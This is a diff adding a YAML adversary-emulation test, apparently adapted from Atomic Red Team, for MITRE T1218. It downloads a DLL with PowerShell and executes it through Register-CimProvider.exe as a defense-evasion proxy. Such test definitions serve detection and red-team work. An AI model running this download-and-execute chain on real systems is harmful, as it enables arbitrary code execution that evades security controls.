@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Register-CimProvider - Execute evil dll
+description: |
+    Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB
+args:
+    - name: dll_payload
+      type: path
+      default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+uuid: ad2c17ed-f626-4061-b21e-b9804a6f3655
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        T1218-2.dll must exist on disk at specified location (#{dll_payload})
+      inline: |
+        if (Test-Path "#{dll_payload}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+        }}
+      executor: powershell
+    - name: register-cimprovider---execute-evil-dll
+      inline: |
+        C:\Windows\SysWow64\Register-CimProvider.exe -Path "{{.Args.dll_payload}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
